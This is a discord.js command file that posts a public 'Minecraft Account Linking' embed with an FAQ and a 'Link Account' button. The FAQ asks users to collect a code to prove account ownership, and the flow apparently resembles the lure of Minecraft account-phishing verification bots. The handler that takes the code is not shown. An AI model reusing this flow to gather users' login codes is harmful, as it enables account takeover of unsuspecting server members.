const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

module.exports = {
    data: {
        name: 'setup',
        description: 'Setup Minecraft account linking',
    },

    async execute(interaction) {
        try {
            // Defer the reply to avoid any "used command" message, no need for a response to the user
            await interaction.deferReply({ ephemeral: false });

            // Wait a second for smooth transition
            await new Promise(resolve => setTimeout(resolve, 1000));

            // Create the embed and button
            const embed = new EmbedBuilder()
                .setTitle('Minecraft Account Linking')
                .setDescription('FAQ\n\n\nQ: Why do we need you to verify?\n\n\nA: You need to verify so we can properly assign you roles and make sure you\'re not a bot!\n\n\nQ: How long does it take for me to get my roles?\n\n\nA: We try to make the waiting time as little as possible, the fastest we were able to make it is as little as 30-50 seconds.\n\n\nQ: Why do you need to collect a code?\n\n\nA: The code confirms with the Minecraft API that you actually own that minecraft account.')
                .setColor('#00FF00');

            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('verify_account')
                        .setLabel('✅ Link Account')
                        .setStyle(ButtonStyle.Success)
                );

            // Send the embed and button to the channel (visible to everyone)
            await interaction.channel.send({ embeds: [embed], components: [row] });

        } catch (error) {
            console.error('Setup command error:', error);
            if (!interaction.replied) {
                await interaction.followUp({
                    content: 'There was an error executing the setup command. Please try again.',
                    ephemeral: true
                });
            }
        }
    }
};
